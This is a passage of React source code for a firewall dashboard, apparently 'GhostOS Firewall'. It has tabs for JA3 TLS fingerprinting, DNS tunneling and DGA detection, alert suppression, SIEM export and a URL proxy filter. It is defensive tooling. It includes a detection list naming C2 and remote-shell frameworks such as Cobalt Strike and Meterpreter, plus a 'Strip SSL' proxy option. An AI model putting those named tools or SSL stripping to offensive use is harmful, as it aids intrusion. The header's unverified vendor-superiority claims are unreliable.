              <div style={{ fontSize:10, color:"#555", marginBottom:4, fontFamily:"monospace" }}>Flags: {s.flags}</div>
              <p style={{ margin:0, fontSize:10, color:"#666", lineHeight:1.5 }}>{s.desc}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 8. JA3/JA3S TLS FINGERPRINTING ──────────────────────────────────────────
function TlsTab() {
  const { data, loading, reload } = useFw<{ fingerprints: Array<{id:number;ja3Hash:string;ja3String:string|null;ja3sHash:string|null;verdict:string;malwareFamily:string|null;description:string|null;action:string;hitCount:number;firstSeen:string;lastSeen:string}> }>("/tls-fingerprints");
  const [lookupHash, setLookupHash] = useState("");
  const [lookupResult, setLookupResult] = useState<{found:boolean;verdict?:string;fingerprint?:{verdict?:string;malwareFamily:string|null;description:string|null;action:string}}|null>(null);

  const VERDICT_COLOR: Record<string,string> = { malicious:"#ff2244", suspicious:"#ff9900", clean:"#00ff88", unknown:"#555" };

  const seed = async () => { await fwPost("/tls-fingerprints/seed",{}); await reload(); };
  const doLookup = async () => {
    if (!lookupHash) return;
    const res = await fwPost("/tls-fingerprints/lookup", { ja3Hash: lookupHash });
    setLookupResult(res);
  };

  return (
    <div>
      <CardBox title="🔐 JA3/JA3S TLS Fingerprinting (Suricata / Zeek)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={seed} color="#4488ff" sm>Seed JA3 Threat DB</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          JA3 fingerprints TLS Client Hello parameters (SSLVersion, Ciphers, Extensions, EllipticCurves, EllipticCurvePointFormats) into an MD5 hash. Malware C2 frameworks have distinctive JA3 hashes regardless of domain or IP — Cobalt Strike, Metasploit, Sliver, Havoc, QakBot, Emotet all have known fingerprints.
        </p>

        {/* JA3 Lookup */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#cc44ff", marginBottom:8 }}>🔎 JA3 Hash Lookup</div>
          <div style={{ display:"flex", gap:8 }}>
            <FwInput placeholder="Enter 32-char MD5 JA3 hash…" value={lookupHash} onChange={e=>setLookupHash(e.target.value)} style={{ width:320 }} />
            <Btn onClick={doLookup} color="#cc44ff">Lookup</Btn>
          </div>
          {lookupResult && (
            <div style={{ marginTop:10, fontFamily:"monospace", fontSize:11 }}>
              {lookupResult.found ? (
                <div style={{ display:"flex", gap:10, alignItems:"center" }}>
                  <Bdg label={lookupResult.fingerprint?.verdict?.toUpperCase()??"?"} color={VERDICT_COLOR[lookupResult.fingerprint?.verdict??""]} sm/>
                  <span style={{ color:"#ff4444" }}>{lookupResult.fingerprint?.malwareFamily ?? "Unknown malware"}</span>
                  <span style={{ color:"#555" }}>— {lookupResult.fingerprint?.description}</span>
                </div>
              ) : (
                <span style={{ color:"#555" }}>Hash not found in local database. Hash may be a legitimate client (Chrome/Firefox default JA3 not flagged).</span>
              )}
            </div>
          )}
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>JA3 Hash</TH><TH>Malware Family</TH><TH>Verdict</TH><TH>Action</TH><TH>Hits</TH><TH>Description</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.fingerprints?.length ? <EmptyRow cols={7} msg="No JA3 fingerprints. Click 'Seed JA3 Threat DB' to load known C2 hashes."/> : data.fingerprints.map(fp=>(
                <tr key={fp.id} style={{ background: fp.verdict==="malicious"?"#ff220211":"transparent" }}>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111", fontFamily:"monospace", fontSize:10, color:"#888" }}>
                    {fp.ja3Hash}<CopyBtn text={fp.ja3Hash}/>
                  </td>
                  <TD c={fp.verdict==="malicious"?"#ff4444":"#ccc"}>{fp.malwareFamily ?? "—"}</TD>
                  <TD><Bdg label={fp.verdict} color={VERDICT_COLOR[fp.verdict]??"#555"} sm/></TD>
                  <TD><Bdg label={fp.action} color={fp.action==="block"?"#ff4444":fp.action==="alert"?"#ff9900":"#00ff88"} sm/></TD>
                  <TD mono c="#ff9900">{fp.hitCount}</TD>
                  <TD c="#666">{fp.description?.substring(0,60)}{(fp.description?.length??0)>60?"…":""}</TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <Btn onClick={async()=>{await fwDelete(`/tls-fingerprints/${fp.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="🦠 Known Malicious JA3 Hashes — Reference">
        <p style={{ margin:"0 0 12px", fontSize:11, color:"#555" }}>These C2 frameworks have distinctive TLS fingerprints detected by JA3. After seeding the database above, ProxhqVPN will alert or block connections matching any of these hashes — regardless of domain or destination IP.</p>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:8 }}>
          {["Cobalt Strike","Metasploit Meterpreter","Dridex","Trickbot","Emotet","AsyncRAT","Sliver C2","Havoc C2","QakBot","IcedID","Brute Ratel C4","Meterpreter HTTPS"].map(f=>(
            <div key={f} style={{ background:"#ff220211", border:"1px solid #ff222233", borderRadius:5, padding:"8px 10px", fontFamily:"monospace", fontSize:10, color:"#ff4444" }}>⚠ {f}</div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 9. DNS SECURITY MONITOR ──────────────────────────────────────────────────
function DnsMonitorTab() {
  const { data, loading, reload } = useFw<{ events: Array<{id:number;queryName:string;queryType:string;sourceIp:string|null;verdict:string;dgaScore:number;tunnelingScore:number;blocked:boolean;detectedAt:string}>; stats:{total:number;dga:number;tunneling:number;blocked:number} }>("/dns-security/events");
  const [analyzeForm, setAnalyzeForm] = useState({ queryName:"", queryType:"A", sourceIp:"" });
  const [analyzeResult, setAnalyzeResult] = useState<{verdict:string;dga:{score:number;isDGA:boolean;reason:string};tunneling:{score:number;isTunneling:boolean}}|null>(null);
  const [analyzing, setAnalyzing] = useState(false);

  const VERDICT_COLOR: Record<string,string> = { clean:"#00ff88", dga:"#ff4444", tunneling:"#cc44ff", malware:"#ff2244", phishing:"#ff6600", suspicious:"#ff9900" };

  const analyze = async () => {
    if (!analyzeForm.queryName) return;
    setAnalyzing(true);
    const res = await fwPost("/dns-security/analyze", analyzeForm);
    setAnalyzeResult(res);
    await reload();
    setAnalyzing(false);
  };

  return (
    <div>
      <CardBox title="🌐 DNS Security Monitor — DGA & Tunneling Detection (Snort/Suricata/IPFire)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Analyzes DNS queries in real-time for Domain Generation Algorithm (DGA) domains used by malware for C2, and DNS tunneling (data exfiltration via DNS TXT/CNAME records). Uses Shannon entropy, consonant ratio, digit ratio, and subdomain depth heuristics — identical to Suricata's dns.events logging and Snort's preprocessor.
        </p>

        {/* Stats row */}
        <div style={{ display:"flex", gap:20, marginBottom:16 }}>
          {[{l:"Total Queries",v:data?.stats?.total??0,c:"#ccc"},{l:"DGA Detections",v:data?.stats?.dga??0,c:"#ff4444"},{l:"Tunneling",v:data?.stats?.tunneling??0,c:"#cc44ff"},{l:"Blocked",v:data?.stats?.blocked??0,c:"#ff2244"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center" }}>
              <div style={{ fontFamily:"monospace", fontSize:20, fontWeight:700, color:s.c }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>

        {/* Live Analyzer */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#4488ff", marginBottom:8 }}>🔬 Analyze DNS Query</div>
          <div style={{ display:"flex", gap:8, flexWrap:"wrap", alignItems:"center" }}>
            <FwInput placeholder="Domain to analyze (e.g. xn--4ca.r4nd0m-c2.xyz)" value={analyzeForm.queryName} onChange={e=>setAnalyzeForm(f=>({...f,queryName:e.target.value}))} style={{ width:320 }} />
            <FwSelect value={analyzeForm.queryType} onChange={e=>setAnalyzeForm(f=>({...f,queryType:e.target.value}))}>
              <option>A</option><option>AAAA</option><option>TXT</option><option>MX</option><option>NS</option><option>CNAME</option>
            </FwSelect>
            <FwInput placeholder="Source IP (optional)" value={analyzeForm.sourceIp} onChange={e=>setAnalyzeForm(f=>({...f,sourceIp:e.target.value}))} style={{ width:150 }} />
            <Btn onClick={analyze} color="#4488ff">{analyzing?"Analyzing…":"Analyze"}</Btn>
          </div>
          {analyzeResult && (
            <div style={{ marginTop:10, display:"flex", gap:12, alignItems:"center", flexWrap:"wrap" }}>
              <Bdg label={analyzeResult.verdict.toUpperCase()} color={VERDICT_COLOR[analyzeResult.verdict]??"#555"} sm/>
              <span style={{ fontFamily:"monospace", fontSize:11, color:"#888" }}>DGA score: <span style={{ color:analyzeResult.dga.score>40?"#ff4444":"#00ff88" }}>{analyzeResult.dga.score}/100</span></span>
              <span style={{ fontFamily:"monospace", fontSize:11, color:"#888" }}>Tunneling score: <span style={{ color:analyzeResult.tunneling.score>40?"#cc44ff":"#00ff88" }}>{analyzeResult.tunneling.score}/100</span></span>
              {analyzeResult.dga.reason && <span style={{ fontFamily:"monospace", fontSize:10, color:"#555" }}>Flags: {analyzeResult.dga.reason}</span>}
            </div>
          )}
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Domain</TH><TH>Type</TH><TH>Source IP</TH><TH>Verdict</TH><TH>DGA Score</TH><TH>Tunnel Score</TH><TH>Blocked</TH><TH>Time</TH></tr></thead>
            <tbody>
              {!data?.events?.length ? <EmptyRow cols={8} msg="No DNS events. Use the analyzer above to test suspicious domains."/> : data.events.map(e=>(
                <tr key={e.id} style={{ background: e.blocked?"#ff220211":e.verdict!=="clean"?"#ff990011":"transparent" }}>
                  <TD mono c={e.verdict==="clean"?"#888":"#fff"}>{e.queryName}</TD>
                  <TD mono c="#555">{e.queryType}</TD>
                  <TD mono c="#666">{e.sourceIp ?? "—"}</TD>
                  <TD><Bdg label={e.verdict} color={VERDICT_COLOR[e.verdict]??"#555"} sm/></TD>
                  <TD mono c={e.dgaScore>40?"#ff4444":"#888"}>{e.dgaScore}/100</TD>
                  <TD mono c={e.tunnelingScore>40?"#cc44ff":"#888"}>{e.tunnelingScore}/100</TD>
                  <TD>{e.blocked?<Bdg label="BLOCKED" color="#ff4444" sm/>:"—"}</TD>
                  <TD mono c="#444">{new Date(e.detectedAt).toLocaleString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 10. ALERT SUPPRESSION / THRESHOLD RULES ───────────────────────────────────
function SuppressionsTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;type:string;track:string;trackValue:string|null;wafRuleId:number|null;attackType:string|null;count:number;seconds:number;enabled:boolean;description:string|null}> }>("/suppressions");
  const [form, setForm] = useState({ name:"", type:"suppress", track:"by_src", trackValue:"", attackType:"", count:"5", seconds:"60", description:"" });
  const [checkForm, setCheckForm] = useState({ attackType:"", sourceIp:"" });
  const [checkResult, setCheckResult] = useState<{suppressed:boolean;rule?:string;reason?:string}|null>(null);
  const [saving, setSaving] = useState(false);

  const TYPE_COLOR: Record<string,string> = { suppress:"#ff9900", threshold:"#4488ff", rate_filter:"#cc44ff" };

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/suppressions", { ...form, count:parseInt(form.count), seconds:parseInt(form.seconds) });
    setForm({ name:"", type:"suppress", track:"by_src", trackValue:"", attackType:"", count:"5", seconds:"60", description:"" });
    await reload(); setSaving(false);
  };
  const checkSuppression = async () => {
    const res = await fwPost("/suppressions/check", checkForm);
    setCheckResult(res);
  };

  return (
    <div>
      <CardBox title="🔕 Alert Suppression / Threshold Rules (Snort/Suricata)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Reduce false-positive noise from WAF/IPS rules. Suppress a rule entirely for a specific IP (equivalent to Snort's suppress keyword), or set a threshold to only alert after N events in T seconds. Identical to Suricata's threshold.conf suppress and threshold blocks.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.type} onChange={e=>setForm(f=>({...f,type:e.target.value}))}>
            <option value="suppress">Suppress</option>
            <option value="threshold">Threshold</option>
            <option value="rate_filter">Rate Filter</option>
          </FwSelect>
          <FwSelect value={form.track} onChange={e=>setForm(f=>({...f,track:e.target.value}))}>
            <option value="by_src">By Source IP</option>
            <option value="by_dst">By Dest IP</option>
            <option value="by_rule">By Rule</option>
            <option value="global">Global</option>
          </FwSelect>
          <FwInput placeholder="Track value (IP / CIDR)" value={form.trackValue} onChange={e=>setForm(f=>({...f,trackValue:e.target.value}))} />
          <FwInput placeholder="Attack type (e.g. sqli)" value={form.attackType} onChange={e=>setForm(f=>({...f,attackType:e.target.value}))} />
          <FwInput placeholder="Count" type="number" value={form.count} onChange={e=>setForm(f=>({...f,count:e.target.value}))} />
          <FwInput placeholder="Seconds" type="number" value={form.seconds} onChange={e=>setForm(f=>({...f,seconds:e.target.value}))} />
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>

        {/* Suppression checker */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:8 }}>🔎 Check Suppression</div>
          <div style={{ display:"flex", gap:8, alignItems:"center" }}>
            <FwInput placeholder="Attack type" value={checkForm.attackType} onChange={e=>setCheckForm(f=>({...f,attackType:e.target.value}))} />
            <FwInput placeholder="Source IP" value={checkForm.sourceIp} onChange={e=>setCheckForm(f=>({...f,sourceIp:e.target.value}))} />
            <Btn onClick={checkSuppression} color="#ff9900">Check</Btn>
            {checkResult && (
              <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                <Bdg label={checkResult.suppressed?"SUPPRESSED":"NOT SUPPRESSED"} color={checkResult.suppressed?"#ff9900":"#00ff88"} sm/>
                {checkResult.rule && <span style={{ fontFamily:"monospace", fontSize:11, color:"#555" }}>{checkResult.reason}</span>}
              </div>
            )}
          </div>
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Type</TH><TH>Track</TH><TH>Track Value</TH><TH>Attack Type</TH><TH>Threshold</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={8} msg="No suppression rules. Add rules above to silence noisy WAF/IPS signatures."/> : data.rules.map(r=>(
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD><Bdg label={r.type} color={TYPE_COLOR[r.type]??"#888"} sm/></TD>
                  <TD mono c="#888">{r.track}</TD>
                  <TD mono c="#ccc">{r.trackValue ?? "—"}</TD>
                  <TD mono c="#ff9900">{r.attackType ?? "—"}</TD>
                  <TD mono c="#4488ff">{r.count}× / {r.seconds}s</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{await fwPut(`/suppressions/${r.id}`,{enabled:!r.enabled}); await reload();}} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Disable":"Enable"}</Btn>
                      <Btn onClick={async()=>{await fwDelete(`/suppressions/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 11. EVE JSON EXPORT ───────────────────────────────────────────────────────
function EveExportTab() {
  const { data, loading, reload } = useFw<{ events: Array<{timestamp:string;event_type:string;src_ip:string;alert?:{category:string;signature:string;severity:number};proxhq_source:string}>; total:number }>("/eve-export?limit=100");
  const [since, setSince] = useState("");

  const downloadNdjson = () => {
    const url = `${API}/eve-export/ndjson${since?`?since=${new Date(since).getTime()}`:""}`;
    window.open(url, "_blank");
  };

  const EVT_COLOR: Record<string,string> = { alert:"#ff4444", dns:"#4488ff", portscan:"#ff9900" };
  const SEV_LABEL: Record<number,string> = { 1:"Critical", 2:"High", 3:"Medium", 4:"Low", 5:"Info" };

  return (
    <div>
      <CardBox title="📄 EVE JSON Event Export (Suricata-Compatible Format)" action={
        <div style={{ display:"flex", gap:8, alignItems:"center" }}>
          <FwInput type="datetime-local" value={since} onChange={e=>setSince(e.target.value)} style={{ width:180 }} />
          <Btn onClick={downloadNdjson} color="#00ff88" sm><Download size={10}/> Download NDJSON</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Exports all ProxhqVPN security events (WAF alerts, DNS detections, portscan events) in Suricata's EVE JSON format — the industry-standard structured event format. Compatible with Elasticsearch, Logstash, Splunk, Kibana (ELK), Grafana, and any SIEM that ingests Suricata logs. Download as NDJSON (one JSON object per line) for direct import.
        </p>
        <div style={{ display:"flex", gap:20, marginBottom:14 }}>
          <div style={{ textAlign:"center" }}>
            <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#00ff88" }}>{data?.total ?? 0}</div>
            <div style={{ fontSize:10, color:"#555" }}>Total Events</div>
          </div>
          {data?.events && (
            <>
              <div style={{ textAlign:"center" }}>
                <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#ff4444" }}>{data.events.filter(e=>e.event_type==="alert").length}</div>
                <div style={{ fontSize:10, color:"#555" }}>WAF Alerts</div>
              </div>
              <div style={{ textAlign:"center" }}>
                <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#4488ff" }}>{data.events.filter(e=>e.event_type==="dns").length}</div>
                <div style={{ fontSize:10, color:"#555" }}>DNS Events</div>
              </div>
              <div style={{ textAlign:"center" }}>
                <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#ff9900" }}>{data.events.filter(e=>e.event_type==="portscan").length}</div>
                <div style={{ fontSize:10, color:"#555" }}>Portscan Events</div>
              </div>
            </>
          )}
        </div>

        {/* Raw EVE sample */}
        {data?.events?.[0] && (
          <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:6, padding:12, marginBottom:14 }}>
            <div style={{ fontFamily:"monospace", fontSize:10, color:"#333", marginBottom:4 }}>SAMPLE EVE JSON EVENT</div>
            <pre style={{ margin:0, fontSize:10, color:"#555", overflowX:"auto" }}>{JSON.stringify(data.events[0], null, 2)}</pre>
          </div>
        )}

        {loading ? <Spinner/> : (
          <div style={{ maxHeight:400, overflowY:"auto" }}>
            <table style={{ width:"100%", borderCollapse:"collapse" }}>
              <thead><tr><TH>Timestamp</TH><TH>Event Type</TH><TH>Source IP</TH><TH>Category</TH><TH>Signature</TH><TH>Severity</TH><TH>Source</TH></tr></thead>
              <tbody>
                {!data?.events?.length ? <EmptyRow cols={7} msg="No events yet. WAF, DNS monitor, and portscan events will appear here."/> : data.events.map((e,i)=>(
                  <tr key={i}>
                    <TD mono c="#444">{new Date(e.timestamp).toLocaleString()}</TD>
                    <TD><Bdg label={e.event_type} color={EVT_COLOR[e.event_type]??"#888"} sm/></TD>
                    <TD mono c="#ccc">{e.src_ip}</TD>
                    <TD mono c="#888">{e.alert?.category ?? "—"}</TD>
                    <TD c="#ccc">{e.alert?.signature?.substring(0,50) ?? "—"}{(e.alert?.signature?.length??0)>50?"…":""}</TD>
                    <TD mono c={e.alert?.severity===1?"#ff2244":e.alert?.severity===2?"#ff4444":e.alert?.severity===3?"#ff9900":"#888"}>{SEV_LABEL[e.alert?.severity??5] ?? "—"}</TD>
                    <TD mono c="#444">{e.proxhq_source}</TD>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </CardBox>
      <CardBox title="🔌 SIEM Integration Guide">
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12 }}>
          <div style={{ background:"#111", borderRadius:6, padding:12 }}>
            <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:8 }}>Elasticsearch / Kibana (ELK)</div>
            <pre style={{ margin:0, fontSize:10, color:"#555", overflowX:"auto" }}>{`# Filebeat input
filebeat.inputs:
  - type: log
    paths: [/var/log/proxhq-eve.json]
    json.keys_under_root: true
    json.add_error_key: true
output.elasticsearch:
  hosts: ["https://elk:9200"]
  index: "proxhq-events-%{+yyyy.MM}"

# Or pipe directly:
curl "${API}/eve-export/ndjson" | 
  curl -X POST elk:9200/_bulk`}</pre>
          </div>
          <div style={{ background:"#111", borderRadius:6, padding:12 }}>
            <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#4488ff", marginBottom:8 }}>Splunk Universal Forwarder</div>
            <pre style={{ margin:0, fontSize:10, color:"#555", overflowX:"auto" }}>{`# inputs.conf
[monitor:///var/log/proxhq-eve.json]
sourcetype = suricata:eve
index = proxhq_security

# Or via HTTP Event Collector:
curl "${API}/eve-export/ndjson" |
  while read line; do
    curl -s -X POST "https://splunk:8088/services/collector/event" \\
      -H "Authorization: Splunk $HEC_TOKEN" \\
      -d '{"event":'$line'}'
  done`}</pre>
          </div>
        </div>
      </CardBox>
    </div>
  );
}

// ── 12. WEB PROXY / CONTENT FILTER ───────────────────────────────────────────
function ProxyRulesTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;matchType:string;matchValue:string;action:string;categories:string|null;priority:number;enabled:boolean;hitCount:number;description:string|null}> }>("/proxy-rules");
  const [form, setForm] = useState({ name:"", matchType:"domain", matchValue:"", action:"block", description:"", priority:"100" });
  const [checkUrl, setCheckUrl] = useState("");
  const [checkResult, setCheckResult] = useState<{matched:boolean;action:string;rule?:string}|null>(null);
  const [saving, setSaving] = useState(false);

  const ACTION_COLOR: Record<string,string> = { allow:"#00ff88", block:"#ff4444", redirect:"#ff9900", strip_ssl:"#cc44ff" };

  const save = async () => {
    if (!form.name || !form.matchValue) return;
    setSaving(true);
    await fwPost("/proxy-rules", { ...form, priority:parseInt(form.priority) });
    setForm({ name:"", matchType:"domain", matchValue:"", action:"block", description:"", priority:"100" });
    await reload(); setSaving(false);
  };
  const checkRule = async () => {
    if (!checkUrl) return;
    const res = await fwPost("/proxy-rules/check", { url: checkUrl });
    setCheckResult(res);
  };

  return (
    <div>
      <CardBox title="🔒 Web Proxy / URL Content Filter (IPFire/OPNsense/pfSense)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={async()=>{await fwPost("/proxy-rules/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          HTTP/HTTPS proxy-level content filtering. Block by domain, URL, regex pattern, MIME type, or category (ads, malware, adult, social). Identical to IPFire's Squid-based URL filter and OPNsense's built-in proxy. Check any URL against active rules in real-time.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1.5fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.matchType} onChange={e=>setForm(f=>({...f,matchType:e.target.value}))}>
            <option value="domain">Domain</option>
            <option value="url">URL Prefix</option>
            <option value="regex">Regex Pattern</option>
            <option value="category">Category</option>
            <option value="mime">MIME Type</option>
          </FwSelect>
          <FwInput placeholder="Match value" value={form.matchValue} onChange={e=>setForm(f=>({...f,matchValue:e.target.value}))} />
          <FwSelect value={form.action} onChange={e=>setForm(f=>({...f,action:e.target.value}))}>
            <option value="block">Block</option>
            <option value="allow">Allow</option>
            <option value="redirect">Redirect</option>
            <option value="strip_ssl">Strip SSL</option>
          </FwSelect>
          <FwInput type="number" placeholder="Priority" value={form.priority} onChange={e=>setForm(f=>({...f,priority:e.target.value}))} />
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>

        {/* URL Checker */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#4488ff", marginBottom:8 }}>🔎 Check URL Against Rules</div>
          <div style={{ display:"flex", gap:8, alignItems:"center" }}>
            <FwInput placeholder="Enter URL to check (e.g. https://example.com/path)" value={checkUrl} onChange={e=>setCheckUrl(e.target.value)} style={{ width:380 }} />
            <Btn onClick={checkRule} color="#4488ff">Check</Btn>
            {checkResult && (
              <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                <Bdg label={checkResult.matched?"MATCHED":"PASS"} color={checkResult.matched?ACTION_COLOR[checkResult.action]??"#ff9900":"#00ff88"} sm/>
                {checkResult.matched && <><Bdg label={checkResult.action.toUpperCase()} color={ACTION_COLOR[checkResult.action]??"#888"} sm/><span style={{ fontFamily:"monospace", fontSize:11, color:"#555" }}>Rule: {checkResult.rule}</span></>}
              </div>
            )}
          </div>
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Match Type</TH><TH>Match Value</TH><TH>Action</TH><TH>Priority</TH><TH>Hits</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={8} msg="No proxy rules. Click 'Seed Defaults' to load basic filters (ads, malware, phishing)."/> : data.rules.map(r=>(
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD mono c="#888">{r.matchType}</TD>
                  <TD mono c="#ccc">{r.matchValue.substring(0,40)}{r.matchValue.length>40?"…":""}</TD>
                  <TD><Bdg label={r.action} color={ACTION_COLOR[r.action]??"#888"} sm/></TD>
                  <TD mono c="#666">{r.priority}</TD>
                  <TD mono c="#ff9900">{r.hitCount}</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{await fwPut(`/proxy-rules/${r.id}`,{enabled:!r.enabled}); await reload();}} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Off":"On"}</Btn>
                      <Btn onClick={async()=>{await fwDelete(`/proxy-rules/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── Main ──────────────────────────────────────────────────────────────────
export default function Firewall() {
  const [tab, setTab] = useState("overview");
  return (
    <div style={{ padding:"20px 24px", minHeight:"100vh", background:"#050505", color:"#ccc" }}>
      <div style={{ marginBottom:18 }}>
        <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:4 }}>
          <Shield size={20} color="#00ff88"/>
          <h1 style={{ margin:0, fontSize:19, fontWeight:800, color:"#fff", fontFamily:"monospace" }}>GhostOS™ Firewall</h1>
          <span style={{ fontSize:10, color:"#333", fontFamily:"monospace" }}>ProxhqVPN NGFW v1.0 · © 2026 Alpha Unlimited Technologies LLC</span>
        </div>
        <p style={{ margin:0, fontSize:11, color:"#444" }}>
          Surpassing Palo Alto NGFW · Fortinet FortiGate · Check Point SandBlast — GhostOS™ ProxhqOS with SymScript™ proprietary symbolic command language
        </p>
      </div>
      <div style={{ display:"flex", gap:2, marginBottom:18, background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:3, flexWrap:"wrap" }}>
        {TABS.map(t=>(
          <button key={t.id} onClick={()=>setTab(t.id)} style={{ display:"flex", alignItems:"center", gap:4, background:tab===t.id?"#181818":"transparent", border:tab===t.id?"1px solid #2a2a2a":"1px solid transparent", color:tab===t.id?(t.id==="ghostos"?"#cc44ff":"#fff"):"#555", borderRadius:6, padding:"6px 11px", cursor:"pointer", fontSize:11, fontFamily:"monospace", transition:"all 0.15s" }}>
            {TAB_ICONS[t.id]}{t.label}{t.id==="ghostos"&&<span style={{fontSize:7,color:"#cc44ff",marginLeft:1}}>™</span>}
          </button>
        ))}
      </div>
      {tab==="overview"&&<OverviewTab/>}
      {tab==="ghostos"&&<GhostOsTab/>}
      {tab==="ips"&&<IpsTab/>}
      {tab==="dpi"&&<DpiTab/>}
      {tab==="threat"&&<ThreatTab/>}
      {tab==="zones"&&<ZonesTab/>}
      {tab==="rules"&&<RulesTab/>}
      {tab==="blacklist"&&<BlacklistTab/>}
      {tab==="analytics"&&<AnalyticsTab/>}
      {tab==="export"&&<ExportTab/>}
      {tab==="analyzer"&&<PayloadAnalyzerTab/>}
      {/* ── Gap-filling features from top 5 open source firewalls ── */}
      {tab==="aliases"     &&<AliasesTab/>}
      {tab==="schedules"   &&<SchedulesTab/>}
      {tab==="nat"         &&<NatTab/>}
